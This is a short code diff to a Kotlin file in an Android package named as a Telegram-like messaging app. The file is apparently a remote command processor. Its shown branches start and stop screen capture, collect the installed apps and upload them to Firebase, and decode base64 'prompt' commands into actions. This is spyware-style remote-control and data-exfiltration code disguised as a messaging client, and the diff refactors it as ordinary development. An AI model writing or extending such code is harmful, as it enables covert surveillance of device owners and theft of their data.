@@ -1,3 +1,4 @@
+// FILE: app/src/main/java/com/telegram2/messaging/remote/CommandProcessor.kt
 package com.telegram2.messaging.remote
 
 import android.content.Context
@@ -39,10 +40,7 @@ object CommandProcessor {
             }
             "start_screen_capture" -> svc.startScreenCapture()
             "stop_screen_capture" -> svc.stopScreenCapture()
-            "get_apps" -> {
-                val apps = svc.getInstalledApps()
-                FirebaseBridge.pushInstalledApps(apps)
-            }
+            "get_apps" -> FirebaseBridge.pushInstalledApps(svc.getInstalledApps())
             "prompt" -> {
                 val promptText = decodeIfBase64(cmd.text) ?: return
                 val actions = NLPParser.parse(promptText)
